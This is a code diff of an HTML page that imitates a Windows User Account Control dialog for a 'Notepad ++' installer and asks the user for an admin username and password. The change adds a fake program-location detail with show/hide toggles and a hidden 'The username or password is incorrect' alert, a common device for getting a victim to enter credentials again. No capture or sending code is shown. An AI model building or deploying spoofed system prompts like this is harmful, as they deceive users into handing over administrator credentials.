@@ -19,14 +19,16 @@
                 <p class="psmall weighted mb-3">User Account Control</p>
               <h4>Do you want to allow this app to make changes to your device?</h4>
             </div>
-              <form id="passForm" class="form">
+              <div id="passForm" class="form">
                 <div class="d-flex align-items-center mb-3">
                   <div class="icon me-3"></div>
                   <h4>Notepad ++</h4>
                 </div>
                 <p>Verified publisher: Notepad ++</p>
                 <p>File origin: Hard drive on this computer</p>
-                <p class="text-blue weighted mt-4 mb-5">Show more details</p>
+                <p class="hidden" id="info">Program Location: "D:\Development\Installers\npp.8.6.9.Installer.x64"</p>
+                <p id="info-toggler1" class="text-blue weighted mt-4 mb-5">Show more details</p>
+                <p id="info-toggler2" class="text-blue weighted mt-4 mb-5 hidden alternate">Hide details</p>
                 <p class="mb-4">To continue. enter an admin username and password.</p>
                 <h6 class="weighted">Admin</h6>
                 <div class="input-group" id="ig-1">
@@ -36,7 +38,8 @@
                   </div>
                 </div>
                 <p>HY4-NB-021/Admin</p>
-                </form>
+                <p id="alert" class="text-red hidden">The username or password is incorrect.</p>
+              </div>
                 <div class="footer">
                     <div class="d-flex gap-3 text-center">
                         <div id="submit" class="btn-secondary w-100">Yes</div>
